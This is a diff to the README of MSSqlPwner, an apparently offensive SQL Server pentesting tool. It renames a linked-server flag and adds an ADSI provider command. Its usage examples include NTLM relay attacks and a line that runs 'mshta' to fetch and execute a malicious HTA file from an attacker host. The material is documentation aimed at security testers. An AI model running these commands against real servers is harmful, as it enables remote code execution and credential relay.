@@ -36,6 +36,7 @@ This tool is designed for security professionals and researchers for testing pur
 - `set-chain` Set chain ID (For interactive-mode only!)
 - `set-link-server` Set link server (For interactive-mode only!)
 - `get-rev2self-queries` retrieve queries to revert to SELF (For interactive-mode only!).
+- `get-adsi-provider-list` retrieve ADSI provider list.
 - `rev2self` revert to SELF (For interactive-mode only!).
 
 2. Command Execution: Execute commands using the following functions:
@@ -94,19 +95,19 @@ python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth interactive
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
 
 # Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 custom-asm hostname
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname
 
 # Executing the hostname command using stored procedures on the linked SRV01 server
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 exec hostname
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
 
 # Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
 
 # Issuing NTLM relay attack on the SRV01 server
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 ntlm-relay 192.168.45.250
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
 
-# Issuing NTLM relay attack on chain ID 5
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 5 ntlm-relay 192.168.45.250
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
 
 # Issuing NTLM relay attack on the local server with custom command
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
